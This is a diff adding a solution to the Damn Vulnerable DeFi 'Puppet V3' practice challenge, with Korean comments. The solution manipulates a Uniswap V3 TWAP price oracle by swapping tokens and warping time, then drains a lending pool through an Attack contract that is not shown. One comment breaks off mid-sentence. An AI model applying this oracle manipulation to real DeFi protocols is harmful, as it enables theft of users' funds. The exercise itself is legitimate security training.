@@ -10,6 +10,7 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {Attack} from "./Attack.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -69,6 +70,10 @@ contract PuppetV3Challenge is Test {
         });
 
         IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
+        // observation cardinality를 최대 40칸 까지 늘림
+        // 40개가 충분한 개수인가?
+        // =>
+        // PuppetV3Pool에서 T
         uniswapPool.increaseObservationCardinalityNext(40);
 
         // Deployer adds liquidity at current price to Uniswap V3 exchange
@@ -78,7 +83,7 @@ contract PuppetV3Challenge is Test {
             INonfungiblePositionManager.MintParams({
                 token0: token0,
                 token1: token1,
-                tickLower: -60,
+                tickLower: -60, // 해당 가격 구간에만 유동성을 추가 
                 tickUpper: 60,
                 fee: FEE,
                 recipient: deployer,
@@ -119,6 +124,14 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
+        Attack attack = new Attack(address(token), address(weth), recovery, address(lendingPool));
+        weth.deposit{value : PLAYER_INITIAL_ETH_BALANCE}();
+        weth.transfer(address(attack), PLAYER_INITIAL_ETH_BALANCE);
+        token.transfer(address(attack), PLAYER_INITIAL_TOKEN_BALANCE);
+
+        attack.swapDVTtoWETH();
+        vm.warp(block.timestamp + 110); // TWAP 반영을 위해 시간 경과
+        attack.drain();
         
     }
 
